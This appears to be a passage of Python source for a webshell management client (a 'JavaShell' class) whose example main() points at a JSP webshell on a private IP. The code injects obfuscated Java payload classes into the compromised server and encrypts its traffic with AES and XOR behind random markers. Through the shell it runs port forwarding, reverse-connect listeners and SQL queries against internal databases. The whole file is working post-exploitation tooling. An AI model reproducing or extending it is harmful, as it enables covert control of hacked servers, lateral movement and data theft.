        parameter = ReqParameter()
        parameter.add("methodName", "readData")
        parameter.add("mappingId", mapping_id)
        result_bytes = self.eval_func(className, "readData", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        # 检查类是否失效
        if "evalClass is null" in result_text:
            print(f"[DEBUG] PortMapping类未加载")
            classinfo = {"original_classname":"PortMapping","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "readData", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        #print(f"[DEBUG] readFromMapping解密后内容: {repr(result_text)}")
        
        # 检查是否有明确的错误类型（新的错误格式）
        if "error:" in result_text:
            error_msg = result_text.replace("error:", "").strip()
            
            # 根据错误类型判断
            if (error_msg.startswith("CONNECTION_CLOSED:") or 
                error_msg.startswith("CONNECTION_NOT_FOUND:") or
                error_msg.startswith("CONNECTION_IO_ERROR:")):
                print(f"[DEBUG] 映射连接已关闭: {mapping_id} - {error_msg}")
                return None  # 返回None表示连接关闭，触发退出循环
            elif error_msg.startswith("CONNECTION_ERROR:"):
                print(f"[DEBUG] 映射连接错误: {mapping_id} - {error_msg}")
                return None
            else:
                # 其他未知错误，也视为连接关闭
                print(f"[DEBUG] 映射未知错误: {mapping_id} - {error_msg}")
                return None
        
        if "ok" not in result_text:
            print(f"[DEBUG] 从映射读取数据格式异常: {result_text}")
            return None
        
        # 提取ok后面的base64数据
        if result_text.startswith("ok"):
            base64_data = result_text[2:]  # 去掉"ok"前缀
            if base64_data:
                try:
                    decoded_data = base64.b64decode(base64_data)
                    print(f"[DEBUG] 从映射读取数据成功: {mapping_id}, 数据长度: {len(decoded_data)}")
                    return decoded_data
                except Exception as e:
                    print(f"[DEBUG] Base64解码失败: {e}")
                    return b""
            else:
                # 没有数据，但连接正常，返回空字节数组
                return b""
        return None

    def get_port_mapping_status(self, className="PortMapping"):
        """
        获取端口映射状态
        :param className: 使用的Java类名
        :return: 状态信息
        """
        parameter = ReqParameter()
        parameter.add("methodName", "getStatus")
        result_bytes = self.eval_func(className, "getStatus", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] PortMapping类未加载")
            classinfo = {"original_classname":"PortMapping","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "getStatus", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok:" in result_text:
            status = result_text.replace("ok:", "").strip()
            print(f"[DEBUG] 端口映射状态: {status}")
            return status
        else:
            print(f"[DEBUG] 获取端口映射状态失败: {result_text}")
            return None

    def clear_all_port_mappings(self, className="PortMapping"):
        """
        清除所有端口映射
        :param className: 使用的Java类名
        :return: 清除结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "clearAllMappings")
        result_bytes = self.eval_func(className, "clearAllMappings", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] PortMapping类未加载")
            classinfo = {"original_classname":"PortMapping","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "clearAllMappings", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 清除所有端口映射失败: {result_text}")
            return False
        print(f"[DEBUG] 清除所有端口映射成功: {result_text}")
        return True

    # ================== 反连端口方法 ==================

    def start_reverse_listener(self, listen_id, listen_port, className="ReverseConnect"):
        """
        启动反连端口监听
        :param listen_id: 监听器标识符
        :param listen_port: 监听端口
        :param className: 使用的Java类名
        :return: 启动结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "startListener")
        parameter.add("listenId", listen_id)
        parameter.add("listenPort", str(listen_port))
        result_bytes = self.eval_func(className, "startListener", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] ReverseConnect类未加载")
            classinfo = {"original_classname":"ReverseConnect","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "startListener", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 启动反连监听失败: {result_text}")
            return False
        print(f"[DEBUG] 启动反连监听成功: {listen_id} on port {listen_port}")
        return True

    def stop_reverse_listener(self, listen_id, className="ReverseConnect"):
        """
        停止反连端口监听
        :param listen_id: 监听器标识符
        :param className: 使用的Java类名
        :return: 停止结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "stopListener")
        parameter.add("listenId", listen_id)
        result_bytes = self.eval_func(className, "stopListener", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] ReverseConnect类未加载")
            classinfo = {"original_classname":"ReverseConnect","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "stopListener", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 停止反连监听失败: {result_text}")
            return False
        print(f"[DEBUG] 停止反连监听成功: {listen_id}")
        return True

    def check_reverse_connections(self, listen_id, className="ReverseConnect"):
        """
        检查反连监听器的新连接
        :param listen_id: 监听器标识符
        :param className: 使用的Java类名
        :return: 新连接信息或None
        """
        parameter = ReqParameter()
        parameter.add("methodName", "checkConnections")
        parameter.add("listenId", listen_id)
        result_bytes = self.eval_func(className, "checkConnections", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        print(f"[DEBUG] 检查反连连接结果: {repr(result_text)}")
        
        if "ok:" not in result_text:
            print(f"[DEBUG] 检查反连连接失败: {result_text}")
            return None
        
        # 解析结果：ok:NEW_CONNECTION:conn_id:client_addr 或 ok:NO_NEW_CONNECTION
        result_data = result_text.replace("ok:", "").strip()
        
        if result_data == "NO_NEW_CONNECTION":
            return None
        elif result_data.startswith("NEW_CONNECTION:"):
            # 解析新连接信息
            parts = result_data.split(":")
            if len(parts) >= 3:
                connection_id = parts[1]
                client_addr = ":".join(parts[2:])  # 处理IPv6地址中的冒号
                print(f"[DEBUG] 发现新反连: {connection_id} from {client_addr}")
                return {
                    'connection_id': connection_id,
                    'client_addr': client_addr,
                    'listen_id': listen_id
                }
        elif result_data.startswith("ERROR:"):
            error_msg = result_data.replace("ERROR:", "").strip()
            print(f"[DEBUG] 检查反连连接错误: {error_msg}")
            return None
        
        return None

    def read_reverse_connection(self, connection_id, className="ReverseConnect"):
        """
        从反连连接读取数据
        :param connection_id: 连接标识符
        :param className: 使用的Java类名
        :return: 读取的数据或None
        """
        parameter = ReqParameter()
        parameter.add("methodName", "readConnection")
        parameter.add("connectionId", connection_id)
        result_bytes = self.eval_func(className, "readConnection", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        print(f"[DEBUG] 反连读取结果: {repr(result_text)}")
        
        # 检查是否有错误
        if "error:" in result_text:
            error_msg = result_text.replace("error:", "").strip()
            print(f"[DEBUG] 从反连读取数据失败: {error_msg}")
            
            if "connection not found" in error_msg or "connection closed" in error_msg:
                print(f"[DEBUG] 反连连接已关闭: {connection_id}")
                return None
            else:
                print(f"[DEBUG] 其他反连读取错误: {error_msg}")
                return None
        
        if "ok" not in result_text:
            print(f"[DEBUG] 从反连读取数据失败: {result_text}")
            return None
        
        # 提取ok后面的base64数据
        if result_text.startswith("ok"):
            base64_data = result_text[2:]  # 去掉"ok"前缀
            if base64_data:
                try:
                    decoded_data = base64.b64decode(base64_data)
                    print(f"[DEBUG] 从反连读取数据成功: {connection_id}, 数据长度: {len(decoded_data)}")
                    return decoded_data
                except Exception as e:
                    print(f"[DEBUG] Base64解码失败: {e}")
                    return b""
            else:
                # 没有数据，但连接正常
                return b""
        return None

    def write_reverse_connection(self, connection_id, data, className="ReverseConnect"):
        """
        向反连连接写入数据
        :param connection_id: 连接标识符
        :param data: 要写入的数据
        :param className: 使用的Java类名
        :return: 写入结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "writeConnection")
        parameter.add("connectionId", connection_id)
        parameter.add("extraData", base64.b64encode(data).decode('utf-8'))
        result_bytes = self.eval_func(className, "writeConnection", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 向反连写入数据失败: {result_text}")
            return False
        print(f"[DEBUG] 向反连写入数据成功: {connection_id}, 数据长度: {len(data)}")
        return True

    def close_reverse_connection(self, connection_id, className="ReverseConnect"):
        """
        关闭反连连接
        :param connection_id: 连接标识符
        :param className: 使用的Java类名
        :return: 关闭结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "closeConnection")
        parameter.add("connectionId", connection_id)
        result_bytes = self.eval_func(className, "closeConnection", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 关闭反连连接失败: {result_text}")
            return False
        print(f"[DEBUG] 关闭反连连接成功: {connection_id}")
        return True

    def get_reverse_connect_status(self, className="ReverseConnect"):
        """
        获取反连状态
        :param className: 使用的Java类名
        :return: 状态信息
        """
        parameter = ReqParameter()
        parameter.add("methodName", "getStatus")
        result_bytes = self.eval_func(className, "getStatus", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok:" in result_text:
            status = result_text.replace("ok:", "").strip()
            print(f"[DEBUG] 反连状态: {status}")
            return status
        else:
            print(f"[DEBUG] 获取反连状态失败: {result_text}")
            return None

    def clear_all_reverse_connects(self, className="ReverseConnect"):
        """
        清除所有反连监听器和连接
        :param className: 使用的Java类名
        :return: 清除结果
        """
        parameter = ReqParameter()
        parameter.add("methodName", "clearAll")
        result_bytes = self.eval_func(className, "clearAll", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] ReverseConnect类未加载")
            classinfo = {"original_classname":"ReverseConnect","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "clearAll", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] 清除所有反连失败: {result_text}")
            return False
        print(f"[DEBUG] 清除所有反连成功: {result_text}")
        return True

    
    
    def include(self, classInfo, second_include=False):
        """
        加载类
        :param classInfo: 包含class_content和classname的字典 或包含original_classname和obfuscation_name的字典
        :return: 加载结果
        """
        if second_include:
            classInfo = self.payload_manager.getPayload(class_name=classInfo["original_classname"],obfuscation_method='specified',specified_name=classInfo["obfuscation_name"])

        parameter = ReqParameter()
        parameter.add("codeName", classInfo["classname"])
        parameter.add("binCode", classInfo["class_content"])
        result_bytes = self.eval_func(None, "include", parameter)
        if "ok" not in result_bytes.decode('utf-8', errors='ignore'):
            print(f"[DEBUG] 发送{classInfo['classname']}类失败: {result_bytes.decode('utf-8', errors='ignore')}")
            return False
        print(f"[DEBUG] 发送{classInfo['classname']}类成功: {result_bytes.decode('utf-8', errors='ignore')}")
        return True

    def test(self) -> bool:
        """测试连接 - 使用类属性中的请求格式"""
        try:
            print(f"[DEBUG] 开始测试连接 (格式: {self.request_format})...")
            
            # 创建参数对象
            parameter = ReqParameter()
            parameter.add("methodName", "test")
            
            # 调用evalFunc方法，使用类属性中的格式
            result_bytes = self.eval_func(None, "test", parameter)
            print(f"[DEBUG] 测试连接结果: {result_bytes}")

            if result_bytes is None:
                print("Error: evalFunc returned None")
                return False
            if result_bytes == b"ok":
                return True
            else:
                return False
                
                
        except Exception as e:
            print(f"Error in test(): {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def sayHello(self, name,className="PayloadTemplate"):
        """测试方法"""
        parameter = ReqParameter()
        parameter.add("methodName", "sayHello")
        parameter.add("name", name)
        result_bytes = self.eval_func(className, "sayHello", parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] PayloadTemplate类未加载")
            classinfo = {"original_classname":"PayloadTemplate","obfuscation_name":className}
            self.include(classinfo,second_include=True)
            result_bytes = self.eval_func(className, "sayHello", parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok" not in result_text:
            print(f"[DEBUG] sayHello失败: {result_text}")
            return False
        print(f"[DEBUG] sayHello成功: {result_text}")
        return result_text

    def exec_sql(self, db_type, db_host, db_port, db_username, db_password, exec_type, exec_sql, className="DatabaseManager"):
        """执行SQL查询"""
        parameter = ReqParameter()
        parameter.add("methodName", "execSql")
        parameter.add("dbType", db_type)
        parameter.add("dbHost", db_host)
        parameter.add("dbPort", str(db_port))
        parameter.add("dbUsername", db_username)
        parameter.add("dbPassword", db_password)
        parameter.add("execType", exec_type)
        parameter.add("execSql", exec_sql)
        
        result_bytes = self.eval_func(className, None, parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] DatabaseManager类未加载")
            classinfo = {"original_classname":"DatabaseManager","obfuscation_name":className}
            self.include(classinfo, second_include=True)
            result_bytes = self.eval_func(className, None, parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "error:" in result_text:
            print(f"[DEBUG] SQL执行失败: {result_text}")
            return False, result_text
        
        if exec_type.lower() == "select":
            if result_text.startswith("ok\n"):
                print(f"[DEBUG] SQL查询成功")
                # 去掉开头的"ok\n"
                return True, result_text[3:]
            else:
                print(f"[DEBUG] SQL查询失败: {result_text}")
                return False, result_text
        else:
            if "Query OK" in result_text:
                print(f"[DEBUG] SQL更新成功: {result_text}")
                return True, result_text[3:]
            else:
                print(f"[DEBUG] SQL更新失败: {result_text}")
                return False, result_text

    def test_database_connection(self, db_type, db_host, db_port, db_username, db_password, className="DatabaseManager"):
        """测试数据库连接"""
        parameter = ReqParameter()
        parameter.add("methodName", "testConnection")
        parameter.add("dbType", db_type)
        parameter.add("dbHost", db_host)
        parameter.add("dbPort", str(db_port))
        parameter.add("dbUsername", db_username)
        parameter.add("dbPassword", db_password)
        
        result_bytes = self.eval_func(className, None, parameter)
        result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "evalClass is null" in result_text:
            print(f"[DEBUG] DatabaseManager类未加载")
            classinfo = {"original_classname":"DatabaseManager","obfuscation_name":className}
            self.include(classinfo, second_include=True)
            result_bytes = self.eval_func(className, None, parameter)
            result_text = result_bytes.decode('utf-8', errors='ignore')
        
        if "ok:" in result_text:
            print(f"[DEBUG] 数据库连接测试成功: {result_text}")
            return True, result_text
        else:
            print(f"[DEBUG] 数据库连接测试失败: {result_text}")
            return False, result_text

    def init_payload(self, class_name="mainPayload_aes_base64"):
        """
        初始化payload - 使用两阶段密钥体系
        第一阶段：使用随机cookie作为加载密钥，对payload进行XOR加密
        第二阶段：payload内部使用通信密钥进行AES通信
        
        Args:
            class_name: Payload类名
        """
        print("[DEBUG] 初始化payload...")

        response_template = self._load_request_format_config("response.json_template")
        if response_template is not None and not self.json_template:
            if isinstance(response_template, (dict, list)):
                self.json_template = json.dumps(response_template)
            else:
                self.json_template = str(response_template)
        
        # 获取payload，并patch通信密钥和参数名
        payload_info = self.payload_manager.getPayload(
            class_name=class_name, 
            json_template=self.json_template,
            secret_key=self.secret_key,  # 通信密钥
            param_name=self.param_name   # 参数名
        )

        # 作为初始化阶段的加载密钥
        self.request_cookie = self._generate_random_cookie(32)
        

        # 使用XOR加密payload（第一阶段加密）
        encrypted_payload = self._xor_encrypt(payload_info["class_content"], self.request_cookie.encode('utf-8'))
        
        # Base64编码
        b64_encrypted_payload = base64.b64encode(encrypted_payload).decode('utf-8')
        
        # 发送请求（标记为初始化请求，直接发送加密数据）
        response = self.send_http_request(b64_encrypted_payload, is_init_request=True)
        
        
        if response.status_code == 200:
            return True
        else:
            return False

    def create_custom_request_body(self, encrypted_base64_data, request_format="form"):
        """
        创建自定义格式的请求体，使用 CustomRequestBuilder
        
        Args:
            encrypted_base64_data: 带请求标记的加密数据
            request_format: 请求格式类型 ("form", "plain", "json", "xml", "png", "plain_binary")
        
        Returns:
            tuple: (request_body, content_type)
        """
        # 使用 CustomRequestBuilder 根据加密类型创建请求体
        # 不再需要传递 cookie_value，因为标记已在 eval_func 中处理
        return self.custom_request_builder.create_request_body(
            encrypted_data=encrypted_base64_data,
            request_format=request_format
        )

    def eval_func(self, class_name=None, func_name=None, parameter=None):
        """
        修复版本的evalFunc函数 - 支持自定义请求格式
        
        正确的数据处理流程：
        1. 格式化参数
        2. gzip压缩
        3. AES加密
        4. Base64编码
        5. 包围请求标记
        6. 创建自定义格式请求体发送
        
        Args:
            request_format: 请求格式，如果为None则使用类属性中的格式
        """
        if parameter is None:
            parameter = ReqParameter()

        request_format = self.request_format
        print(f"[DEBUG] 执行命令: class_name={class_name}, func_name={func_name}, 请求格式={request_format}")
        
        # 如果指定了类名，添加evalClassName参数
        if class_name and class_name.strip():
            parameter.add("evalClassName", class_name.strip())
        
        # 添加方法名参数
        if func_name:
            parameter.add("methodName", func_name)
        
        # 格式化参数
        formatted_params = parameter.format()
        #print(f"[DEBUG] 格式化参数长度: {len(formatted_params)}")
        
        # gzip压缩参数
        compressed_data = self.encryptPayload.gzip_compress(formatted_params)
                
        # 根据请求格式来选择加密方式
        if request_format == "plain" or request_format == "xml" or request_format == "json" or request_format == "form":
            encrypted_data = self.encryptPayload.encryptAesBase64(compressed_data)
        elif request_format == "png" or request_format == "plain_binary":
            encrypted_data = self.encryptPayload.encryptAesRaw(compressed_data)
        else:
            encrypted_data = self.encryptPayload.encryptAesBase64(compressed_data)
        
        # 生成动态cookie并用于请求的左右标记
        import uuid
        self.request_cookie = self._generate_random_cookie(32)

        # 根据请求格式并处理加密数据
        if request_format == "plain" or request_format == "xml" or request_format == "json":
            req_left_marker, req_right_marker = self._generate_marker(self.request_cookie + "REQ_MARKER",self.secret_key)
            marked_encrypted_data = req_left_marker + encrypted_data + req_right_marker
            print(f"[DEBUG] aes_base64 纯加密格式，请求标记: {req_left_marker[:8]}...{req_right_marker[:8]}")
            print(f"[DEBUG] 请求Cookie: {self.request_cookie}")
        elif request_format == "form":
            marked_encrypted_data = encrypted_data
            print(f"[DEBUG] aes_base64 表单格式，无请求标记")
        elif request_format == "png" or request_format == "plain_binary":
            req_left_marker, req_right_marker = self._generate_binary_marker(self.request_cookie + "REQ_MARKER",self.secret_key)
            marked_encrypted_data = req_left_marker + encrypted_data + req_right_marker
            print(f"[DEBUG] aes_base64 纯二进制格式，请求标记: {req_left_marker[:8]}...{req_right_marker[:8]}")
            print(f"[DEBUG] 请求Cookie: {self.request_cookie}")
        else:
            print(f"[DEBUG] 不支持{request_format}格式")
            return
                    
        # 发送HTTP请求（带重试逻辑）
        max_retries = 3
        for retry_count in range(max_retries + 1):
            response = self.send_http_request(marked_encrypted_data, is_init_request=False)
            
            # 如果返回None，表示遇到500错误，需要重新初始化
            if response.status_code == 500:
                if retry_count < max_retries:
                    print(f"[DEBUG] 第{retry_count + 1}次重试：重新初始化payload")
                    try:
                        # 重新初始化payload（使用原有的class_name和webshell_id）
                        class_name_pattern = f"mainPayload_{self.response_encrypt_type}"
                        self.init_payload(class_name=class_name_pattern)
                        continue  # 继续下一次重试
                    except Exception as init_error:
                        print(f"[DEBUG] 重新初始化失败: {init_error}")
                        continue
                else:
                    print(f"[DEBUG] 重试{max_retries}次后仍然失败，放弃")
                    return b"ERROR: Maximum retries exceeded"
            else:
                # 请求成功，跳出重试循环
                break
        else:
            # 如果循环正常结束（没有break），说明所有重试都失败了
            return b"ERROR: All retries failed"

        response_text = response.content.decode('utf-8', errors='ignore')
        
        # 5. 根据加密类型选择解析方式
        if "aes_base64" in self.response_encrypt_type:
            return self.parse_response_aes_base64(response_text)
        else:
            return self.parse_response_aes_raw(response.content)


    def parse_response_xor_base64(self, response_data: str) -> Optional[bytes]:
        """
        解码响应数据：使用Base64编码的标记定位后Base64解码和XOR解密
        支持纯Base64字符串和JSON格式的响应
        
        Args:
            response_data: 服务器响应的原始数据（Base64格式或JSON格式）
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的左右标记（Base64格式）
            left_marker_base64, right_marker_base64 = self._generate_marker(self.request_cookie, self.secret_key)
            
            # 尝试解析JSON格式（如果是JSON响应，自动查找包含标记的字段）
            if response_data.strip().startswith('{'):
                try:
                    response_json = json.loads(response_data)
                    # 如果是JSON格式，遍历所有字段值查找包含左标记的字段
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if isinstance(value, str) and left_marker_base64 in value:
                                response_data = value
                                print(f"[DEBUG] 检测到JSON响应，已从 '{key}' 字段提取加密数据")
                                break
                except json.JSONDecodeError:
                    # 不是有效的JSON，继续按纯字符串处理
                    pass
            
            # 查找Base64编码的左右标记位置（无等号版本）
            left_pos = response_data.find(left_marker_base64)
            right_pos = response_data.rfind(right_marker_base64)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的Base64标记 左: {left_marker_base64}, 右: {right_marker_base64}")
                print(f"[DEBUG] 响应数据: {response_data[:100]}...")
                return None
            
            # 提取中间的加密数据（Base64格式，无填充符）
            # Base64标记长度为11字符（8字节二进制 -> 12字符Base64 -> 去除等号后11字符）
            encrypted_data_base64 = response_data[left_pos + len(left_marker_base64):right_pos]
            
            # 重新添加必要的填充符（因为服务端去除了等号）
            missing_padding = (4 - len(encrypted_data_base64) % 4) % 4
            if missing_padding:
                encrypted_data_base64 += '=' * missing_padding
            
            # XOR解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptXorBase64(encrypted_data_base64)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def parse_response_xor_raw(self, response_data: bytes) -> Optional[bytes]:
        """
        解码响应数据：使用二进制标记定位后XOR解密（xor_raw模式）
        
        Args:
            response_data: 服务器响应的原始二进制数据
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的二进制左右标记（使用 request_cookie，与服务端一致）
            left_marker, right_marker = self._generate_binary_marker(self.request_cookie, self.secret_key)
            
            # 查找左右标记的位置（二进制搜索）
            left_pos = response_data.find(left_marker)
            right_pos = response_data.rfind(right_marker)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的响应标记 左: {left_marker.hex()}, 右: {right_marker.hex()}")
                return None
            
            # 提取被标记包裹的加密数据（纯二进制，无Base64）
            # 二进制标记长度为8字节
            encrypted_data = response_data[left_pos + 8:right_pos]
            
            # XOR解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptXorRaw(encrypted_data)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            return None
            
    def parse_response_aes_base64(self, response_data: str) -> Optional[bytes]:
        """
        解码响应数据：使用Base64编码的标记定位后Base64解码和AES解密
        支持纯Base64字符串和JSON格式的响应
        
        Args:
            response_data: 服务器响应的原始数据（Base64格式或JSON格式）
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            if isinstance(response_data, bytes):
                response_data = response_data.decode('utf-8', errors='ignore')

            # 生成响应的左右标记（Base64格式）
            left_marker_base64, right_marker_base64 = self._generate_marker(self.request_cookie, self.secret_key)
            if isinstance(left_marker_base64, bytes):
                left_marker_base64 = left_marker_base64.decode('utf-8', errors='ignore')
            if isinstance(right_marker_base64, bytes):
                right_marker_base64 = right_marker_base64.decode('utf-8', errors='ignore')
            
            # 尝试解析JSON格式（如果是JSON响应，自动查找包含标记的字段）
            if response_data.strip().startswith('{'):
                try:
                    response_json = json.loads(response_data)
                    # 如果是JSON格式，遍历所有字段值查找包含左标记的字段
                    if isinstance(response_json, dict):
                        for key, value in response_json.items():
                            if isinstance(value, str) and left_marker_base64 in value:
                                response_data = value
                                print(f"[DEBUG] 检测到JSON响应，已从 '{key}' 字段提取加密数据")
                                break
                except json.JSONDecodeError:
                    # 不是有效的JSON，继续按纯字符串处理
                    pass
            
            # 查找Base64编码的左右标记位置（无等号版本）
            left_pos = response_data.find(left_marker_base64)
            right_pos = response_data.rfind(right_marker_base64)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的Base64标记 左: {left_marker_base64}, 右: {right_marker_base64}")
                print(f"[DEBUG] 响应数据: {response_data[:100]}...")
                return None
            
            # 提取中间的加密数据（Base64格式，无填充符）
            encrypted_data_base64 = response_data[left_pos + len(left_marker_base64):right_pos]
            
            # 重新添加必要的填充符（因为服务端去除了等号）
            missing_padding = (4 - len(encrypted_data_base64) % 4) % 4
            if missing_padding:
                encrypted_data_base64 += '=' * missing_padding
            
            # AES解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptAesBase64(encrypted_data_base64)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            import traceback
            traceback.print_exc()
            return None
    
    def parse_response_aes_raw(self, response_data: bytes) -> Optional[bytes]:
        """
        解码响应数据：使用二进制标记定位后AES解密（aes_raw模式）
        
        Args:
            response_data: 服务器响应的原始二进制数据
            
        Returns:
            解码后的数据，失败返回None
        """
        try:
            # 生成响应的二进制左右标记（使用 request_cookie，与服务端一致）
            left_marker, right_marker = self._generate_binary_marker(self.request_cookie, self.secret_key)
            
            # 查找左右标记的位置（二进制搜索）
            left_pos = response_data.find(left_marker)
            right_pos = response_data.rfind(right_marker)
            
            if left_pos == -1 or right_pos == -1 or left_pos >= right_pos:
                print(f"[DEBUG] 响应标记定位失败")
                print(f"[DEBUG] 期望的响应标记 左: {left_marker.hex()}, 右: {right_marker.hex()}")
                return None
            
            # 提取被标记包裹的加密数据（纯二进制）
            encrypted_data = response_data[left_pos + 8:right_pos]
            
            # AES解密 - 对bytes数据进行解密
            decrypted_data = self.encryptPayload.decryptAesRaw(encrypted_data)
            
            # 检查是否是gzip压缩数据并解压
            if len(decrypted_data) >= 2 and decrypted_data[0] == 0x1f and decrypted_data[1] == 0x8b:
                try:
                    return gzip.decompress(decrypted_data)
                except Exception as gzip_error:
                    print(f"[ERROR] Gzip解压失败: {gzip_error}")
                    return decrypted_data
            else:
                return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解码响应数据失败: {e}")
            return None
    

# 使用示例
def main():
    # 初始化客户端
    shell = JavaShell(
        url="http://172.26.36.30:8080/webshell/test.jsp",
        param_name="pass", 
        secret_key="test"
    )

    # 配置javaShell的参数
    shell.session.proxies = {
        "http": "http://172.26.32.1:8081",
    }

    shell.response_encrypt_type = 'aes_base64'
    #shell.json_template = "{\"status\":\"success\",\"encrypted_data\":\"PAYLOAD_DATA\",\"version\":\"1.0\"}"

    # 测试配置文件路径
    import os
    current_dir = os.path.dirname(os.path.abspath(__file__))
    data_dir = os.path.join(current_dir, '../data')
    custom_config_file = os.path.join(data_dir, "request_format_define.json")
    shell.request_format_file = custom_config_file
    shell.request_format = "form"

    if shell.init_payload("mainPayload_aes_base64"):
        print("初始化成功")
        shell.test()
    else:
        print("初始化失败")
        return
    
   
 
    
    # 测试读取文件指定位置和长度的数据块
if __name__ == "__main__":
    main()
